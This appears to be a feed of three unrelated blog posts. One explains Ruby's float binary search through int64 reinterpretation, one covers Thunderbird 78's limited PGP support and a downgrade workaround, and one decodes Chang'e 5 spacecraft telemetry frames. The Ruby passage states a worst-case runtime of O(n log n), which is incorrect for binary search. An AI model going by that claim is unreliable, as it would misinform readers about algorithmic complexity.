and <code>9218868437227405312</code>. What’s the midpoint of this range? It’s <code>4609434218613702656</code>. Now let’s plug this value back into <a href="https://float.exposed/0x3ff8000000000000">float.exposed</a>.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/one_point_five.png"> </figure> <p>Oh look, it’s 1.5!</p> <p>Using this same technique, you can now find out why the binary search examines <code>1.6759759912428246e+154</code> and <code>1.5921412270130977e+77</code> after this. This is left as an exercise for the reader.</p>  <p>The reason why this works is simple once you wrap your head around it. It’s because the more significant bits are always in a more significant position (than the bits to the right of it) in floating-point numbers. This is obviously true for the significand. But this is also true for the exponent because the next power of 2 can’t be reached by just increasing the significand, the exponent has to be increased. So thus a larger exponent will always mean that the floating-point number has a larger magnitude.</p> <p>Once this is true, we can see why binary search works using this technique. It works because if <code>x</code> and <code>y</code> are doubles and <code>x &gt; y</code>, then we have shown that <code>double_as_int64(x) &gt; double_as_int64(y)</code> is also true. This is the requirement for binary search because the values remain strictly increasing (<em>technically</em> binary search only requires monotonically increasing, but strictly increasing is a tighter guarantee than monotonically increasing).</p>  <p>Ruby’s binary search in a range uses a clever technique to perform binary search when the endpoints are doubles while maintaining a worst-case runtime of <code>O(n log n)</code>. In fact, this technique isn’t specific to Ruby and can be used in any language that uses IEEE 754 floating-point numbers.</p>  </div> </article> </div></div>]]>

<p>I am writing this post because Thunderbird 78.x has issues for advanced PGP users. But first, I’d like to say a few words to all the frustrated users: I hear you, I too am displeased with this update, but while it’s easy to complain and rant, we should look at the bright side and still be grateful that Mozilla thought of including PGP, as it makes it more accessible to users that are not as tech-savvy. It’s always good to push for privacy and having it built-in, and easy to use! But, there are issues with the new built-in PGP that we should talk about…</p>
<h2>Preface</h2>
<p>You know, as I stated in <a href="https://www.sindastra.de/p/1566/open-letter-why-it-security-is-obvious-to-me/" target="_blank" rel="noreferrer noopener">my open letter</a>: Security and privacy is important to me. Of course, this means I use PGP, or more specifically, GnuPG with smartcards.</p>
<p>I like FOSS, especially if it’s cross-platform as I use Linux, Mac and Windows (alphabetical order, no preference stated) and it’s great to be able to use your software on all your machines across all systems, and for free! The popular email client, Thunderbird is one such application that meets these criteria, and so is GnuPG (or GPG for short), a popular application that implements the OpenPGP specification.</p>
<p>GnuPG has a ton of features, among those features is the support of smartcards. Keep this in mind.</p>
<p>Now, let’s take a look at the situation in Thunderbird before, and then since version 78.x and what we can do about it.</p>
<h2>The situation <em>before</em> version 78.x</h2>
<p>Before Thunderbird 78.x (namely 68.x), if you had both Thunderbird and GnuPG installed, all you had to do was to install a Thunderbird addon known as Enigmail. This addon basically bridged the gap between Thunderbird and GnuPG, and essentially allowed you to experience full PGP within Thunderbird.</p>
<p>Of course this meant you had to install GnuPG on your system, then an addon, then generate and manage keys, and – although powerful – it was overall not as user-friendly as it could be.</p>
<p>So, even I as an advanced user, was excited that Thunderbird would come with PGP built-in in 78.x as I thought they might ship it with GnuPG, and something like Enigmail but built-in and maybe more user-friendly. At the very least having no third-party things to install sounds better. And convenience is nice, right? But I was wrong.</p>
<h2>The situation <em>since</em> version 78.x</h2>
<p>You see, Mozilla, the people behind Thunderbird did not ship it with GnuPG. Instead, they use a library called RNP. This library does not provide full-featured PGP.</p>
<p>RNP does for example, not support the use of smartcards. Which, basically means no PGP at all for me or any user with smartcards. Thunderbird does currently also not support using subkeys with detached primary key. Which means any advanced user that did a proper, more secure PGP setup, can also not use PGP with Thunderbird for the time being.</p>
<p>So, you might think to yourself: Just install Enigmail! Well, here’s the thing: Enigmail does not work with Thunderbird 78.x!</p>
<p>Thunderbird 78.x has hidden settings in the advanced configuration editor, that you can use to tell it to use external GnuPG, which is great! Except it doesn’t really work…</p>
<p>It did not work for me, and I tried many things, on different systems, followed different guides (including the official Mozilla Wiki), and heard the same from other users through the fediverse. For a friend of mine, setting up Thunderbird to use external GnuPG on Windows made it outright crash whenever trying to open a PGP encrypted email!</p>
<p>And this is basically the problem. On one hand, Mozilla was cool enough to include (some) PGP in Thunderbird which in theory makes it more accessible as you can generate and use keys with a few clicks, which is also good for us advanced users as we can then email privately with friends that would otherwise be unable to use PGP. But on the other hand the execution was bad in such a way that it stabs all the advanced users that were already using (advanced setups of) PGP.</p>
<h2>What to do about it (for now)</h2>
<p>Honestly, my advice to anyone that uses Thunderbird and depends on advanced PGP (smartcard etc.) for now: Just downgrade to Thunderbird 68.x and install Enigmail. It seems it will still receive updates for now and there’s no forced update to 78.x (yet). I just tried, and got an (undocumented) update for the 68.x version (namely 68.12.1).</p>
<p>Let’s hope they will keep providing security updates for 68.x until they have (hopefully) sorted out PGP in version 78.x so that we will eventually be able to upgrade, but without being pushed into a broken environment prematurely.</p>
<p>You can get the latest version of 68.x from here (official download link): <a href="https://download-installer.cdn.mozilla.net/pub/thunderbird/releases/68.12.1/" target="_blank" rel="noreferrer noopener nofollow">https://download-installer.cdn.mozilla.net/pub/thunderbird/releases/68.12.1/</a></p>
<p>Please note that, Thunderbird will notice that the current configuration is from a newer version after downgrading, which you cannot use. This will result in a little window informing you about that on startup. Your only two options are to quit the application, or to create a new (configuration) profile. This means you will have to set up your accounts again but at least PGP will work again (with Enigmail and GnuPG)!</p>
<p>Thank you and goodnight! :D</p>
<h2>UPDATE 2020-NOV-29</h2>
<p>Hey everyone, this article drew many visitors after it was posted on HN (thanks, kind stranger!) and I did read through the comments (both here and some on HN)!</p>
<p>I’d like to address some things:</p>
<ol><li>I saw a tl;dr on HN which mentioned the downgrade recommendation, but without the details. As I understood it, it got criticized as you need to stay up to day for security reasons. And I agree with that. However, I’d like to make it clear that I only recommended a downgrade for now, as it seems the 68.x branch is still getting updates, as I experienced myself. As long as Thunderbird does not drop support for 68.x, and does not force an upgrade to 78.x, I think downgrading is fine. When Thunderbird finally drops support for 68.x, I would of course not recommend staying on outdated software.</li><li>When Thunderbird 68.x reaches EOL, and if 78.x hasn’t sorted out the issues with PGP by then, an alternative, if you’re on Windows and have MS Outlook, would be the free GpgOL extension for Outlook that comes bundled with Gpg4win. Please note that I don’t have experience with this myself, but I’d like to point it out anyway in case it’s useful. There’s also a (paid) Apple Mail extension that comes with gpgtools, however I do not recommend it unless you don’t mind paying for each new major version every year.</li><li>Thank you for informing me that Thunderbird is not part of Mozilla Corporation anymore, but as I understood it, still part of Mozilla Foundation. So, I guess in that case I’m addressing the Mozilla foundation. If this is still wrong, please let me know.</li></ol>
<p>PS I was exhausted and it was late at night when I originally wrote this article, and I wasn’t fully happy with it but people seemed to like it and had very constructive feedback which really helps. Thank you all for stopping by and reading it! &lt;3</p>

<p><a href="https://en.wikipedia.org/wiki/Chang%27e_5">Chang’e 5</a> is a Chinese lunar sample return mission. It was launched a few days ago on 2020-11-23 from <a href="https://en.wikipedia.org/wiki/Wenchang_Satellite_Launch_Center">Wenchang</a> and <a href="https://twitter.com/coastal8049/status/1331782149490413568">is estimated</a> to perform lunar orbit injection on Saturday. Since then, a number of Amateurs such as <a href="https://twitter.com/usa_satcom/status/1331092113069543425">USA Satcom</a>, <a href="https://twitter.com/uhf_satcom/status/1331317024992210944">Paul Marsh M0EYT</a>, <a href="https://twitter.com/coastal8049/status/1331138035891650560">Scott Tilley VE7TIL</a>, <a href="https://twitter.com/supertrack_it/status/1331354629146365953">Fer IW1DTU</a> and others have been receiving the X-band signals from the spacecraft and posting reports over on Twitter. Meanwhile, <a href="http://r00t.cz/">r00t.cz</a> has been working in <a href="https://twitter.com/r2x0t/status/1331097492482646016">decoding the frames</a>, which has led him to the amazing achievement of being able to <a href="http://www.r00t.cz/Sats/Change5">retrieve a short video</a> from the signal.</p>



<p>In this post I will look at some of the frames demodulated by USA Satcom and Paul during the first couple of days of the mission. The frame structure has many similarities with Tianwen-1, which I have described in several posts, such as <a href="https://destevez.net/2020/08/tianwen-1-telemetry-framing-and-data/" data-type="post" data-id="8773">here</a> and <a href="https://destevez.net/2020/08/tianwen-1-high-speed-data-signal/" data-type="post" data-id="8871">here</a>. However, there are some interesting differences.</p>



<h4>Low data rate telemetry</h4>



<p>The low data rate telemetry signal is a PCM/PSK/PM signal with a subcarrier rate of 65536 Hz and a baudrate of 2048 baud. The coding is CCSDS concatenated frames with a Reed-Solomon codeword size of 252 bytes, so that a frame takes 2 seconds to transmit. The Reed-Solomon code uses the dual basis, as specified in the <a href="https://public.ccsds.org/Pubs/131x0b3e1.pdf">TM Synchronization and Channel Coding</a> blue book. This is very similar to Tianwen-1’s low rate signal. The only differences are that Tianwen-1 uses a baudrate of 16384 baud (so frames take 0.25 seconds to transmit), and the conventional Reed-Solomon basis (which is not standard CCSDS).</p>



<p>Chang’e 5 has been seen to use <a href="https://twitter.com/coastal8049/status/1331782140900503556">a number of different frequencies</a> at X-band. Here I will be looking at some frames received by USA Satcom on 2020-11-24 between 4 and 6 UTC.</p>



<p>The frames are CCSDS <a href="https://public.ccsds.org/Pubs/732x0b3e1.pdf">AOS frames</a> coming from spacecraft ID 91. The spacecraft ID is quite relevant, because the spacecraft has different detachable modules: a service module, a return module, a lander, and an ascent module. Most likely each of these modules uses a different spacecraft ID, and we are in fact seeing data from different spacecraft IDs.</p>



<p>Two virtual channels are in use. Virtual channel 1 contains most of the data (a total of 5888 frames), while virtual channel 2 contains only 5 frames.</p>



<p>The AOS frames in both virtual channels have an insert zone that is 8 bytes long. The purpose of the first 4 bytes is unknown, while the last 4 bytes are a little-endian timestamp encoded as the number of seconds elapsed since 2012-08-01 00:00:00 UTC. It is interesting to compare this timestamp format with <a href="https://destevez.net/2020/07/more-about-the-tianwen-1-timestamps/" data-type="post" data-id="8734">that used in Tianwen-1</a>, which uses a 48 bit big-endian timestamp that encodes 100us units since 2016-01-01 00:00:00 Beijing time. The change from big-endian to little-endian is peculiar, since somehow the CCSDS protocols favour big-endian fields, and the change from a Beijing time epoch to a UTC epoch is also an interesting curiosity.</p>



<p>The M_PDU protocol is used to multiplex CCSDS <a href="https://public.ccsds.org/Pubs/133x0b2e1.pdf">Space Packets</a> in the AOS frames.</p>



<p>The figure below shows the timestamps and virtual channel frame counter in the frames from virtual channel 1. The gaps correspond to time gaps between the different files provided by USA Satcom.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png"><img loading="lazy" width="625" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1.png 625w, https://destevez.net/wp-content/uploads/2020/11/ce5_vcid1-300x186.png 300w" sizes="(max-width: 625px) 100vw, 625px"></a></figure>



<p>The Space Packets in virtual channel 1 use many different APIDs. I have been browsing through the plots of the data in each of the APIDs and they look reminiscent of Tianwen-1. There are many analogue telemetry channels, but I haven’t been able to spot any that has an obvious meaning, and there doesn’t seem to be any floating point data as in Tianwen-1. Here I show a few of the most interesting APIDs.</p>

<p>The five frames in virtual channel 2 were transmitted consecutively, perhaps in response to a telecommand. Each of them contains a single Space Packet from APID 897 that occupies all the frame.</p>



<p>The data from these Space Packets looks like some kind of file download or memory dump. The first 8 bytes contain three fixed bytes that maybe identify the file or the region of memory followed by a 5 byte little-endian chunk counter. The transfer here uses only 5 chunks, and most of the data in the last chunk is filled with <code>0xaa</code> padding bytes. The figure below shows the data in this transfer, with one chunk per row. The data clearly shows patterns, but I have no idea what it is.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2.png"><img loading="lazy" width="644" height="187" src="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-644x187.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-644x187.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-300x87.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2-768x223.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_vc2.png 864w" sizes="(max-width: 644px) 100vw, 644px"></a><figcaption>Chang’e transfer in APID 897</figcaption></figure>



<p>The code and data used in this part of the post, including the full plots of all the APIDs, can be found in <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/CE5/CE-5%20frame%20analysis.ipynb">this Jupyter notebook</a>.</p>



<h4>High data rate telemetry</h4>



<p>The high data rate telemetry uses 2.5Mbaud BPSK <a href="https://twitter.com/r2x0t/status/1331351055972642818">according to r00t</a>. Coding is, as in the case of <a href="https://destevez.net/2020/08/tianwen-1-high-speed-data-signal/">Tianwen-1 high data rate long frames</a>, concatenated CCSDS frames using four interleaved Reed-Solomon codewords (with 255 bytes each).</p>



<p>The data used here is a short segment received by Paul on 2020-11-24 between 20:52 and 20:58 UTC at 8455 MHz. It is quite interesting to see the errors corrected by the Reed-Solomon decoder, which show large variability but indicate that Paul has more than enough SNR margin to decode the signal.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png"><img loading="lazy" width="612" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_rs.png 612w, https://destevez.net/wp-content/uploads/2020/11/ce5_rs-300x190.png 300w" sizes="(max-width: 612px) 100vw, 612px"></a></figure>



<p>The data consists of AOS frames from spacecraft ID 26 (note this is a different spacecraft ID to the one in the low rate data used in the previous part). Virtual channels 38 and 63 are in use, with 18396 and 51850 frames respectively.</p>



<p>In contrast to the AOS frames used for the low data rate telemetry, here the AOS insert zone is only 6 bytes long, with 2 unknown bytes that always contain the value <code>0xf0f0</code> followed by a 4 byte timestamp using the same format as in the low data rate frames. There is no M_PDU. The data follows directly after the insert zone.</p>



<p>Virtual channel 63 consists solely of idle data. This is a standard feature of the AOS Space Data Link protocol called OID channel (only idle data), which is always virtual channel 63. The data in the frames of this virtual channel is filled with <code>0xaa</code> padding.</p>



<p>The figure below shows the timestamps and frame counter in the OID channel.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid.png"><img loading="lazy" width="644" height="385" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-644x385.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-644x385.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid-300x179.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid.png 647w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The frame loss computed from the jumps in the virtual channel frame counter shows that very few frames were lost. The large jumps near the end correspond to a gap in Paul’s data, which is divided into two files.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png"><img loading="lazy" width="625" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss.png 625w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_oid_loss-300x186.png 300w" sizes="(max-width: 625px) 100vw, 625px"></a></figure>



<p>Virtual channel 38 is quite interesting. I <a href="https://twitter.com/ea4gpz/status/1331711668045434886">joked on Twitter</a> that it resembles the Inception film, because it has several layers of CCSDS protocols. The timestamps in this virtual channel are quite weird, since comparing with the timestamps from the OID channel they seem to run too fast and extend into the future. There is no way that the 18396 frames in this virtual channel are able to span one hour and 30 minutes as shown here. I’m not sure what’s happening with this.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc.png"><img loading="lazy" width="644" height="385" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc-644x385.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc-644x385.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc-300x179.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc.png 647w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>This shows the first frames in virtual channel 38. We can discern the AOS headers, then two parts that seem quite similar, and then a large section of <code>0xaa</code> padding.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data.png"><img loading="lazy" width="644" height="173" src="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-644x173.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-644x173.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-300x80.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data-768x206.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_sc26_vc38_fc_data.png 877w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>The data field of each of these AOS frames contains a single Space Packet, which is embedded directly without using M_PDU. The length of the Space Packet is 510 bytes including its header, which explains why the end of the AOS frame is filled with padding. These Space Packets belong to APID 92.</p>



<p>The contents of each of these Space Packets are two back to back AOS frames, which explains the repetition in the figure below. The AOS frames belong to spacecraft ID 197 (yet a new spacecraft!), virtual channel ID 52, and have the replay flag set.</p>



<p>The insert zone of these replayed AOS frames contains three unknown bytes followed by a 32 bit timestamp in the usual format. The timestamps and frame counts are shown below. The replay data is actually from the previous day, starting just 30 minutes after launch.</p>



<figure><img loading="lazy" width="631" height="387" src="https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc.png" alt="" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc.png 631w, https://destevez.net/wp-content/uploads/2020/11/ce5_replay_fc-300x184.png 300w" sizes="(max-width: 631px) 100vw, 631px"></figure>



<p>These AOS frames have a CRC-16, in contrast with the usual AOS frames, which rely on the Reed-Solomon parity check bytes for error detection. The CRC of all the replay frames I’ve decoded is correct.</p>



<p>These replay AOS frames use M_PDU, and contain Space Packets from APIDs 301 and 2047 (the idle APID). As expected, the idle APID packets contain only zeros. The data in APID 301 is shown in the figure below. I am not sure how to interpret it, but some of the structure is evident.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2020/11/ce5_apid301.png"><img loading="lazy" src="https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-644x640.png" alt="" width="644" height="640" srcset="https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-644x640.png 644w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-300x298.png 300w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-150x150.png 150w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-768x763.png 768w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301-100x100.png 100w, https://destevez.net/wp-content/uploads/2020/11/ce5_apid301.png 923w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>
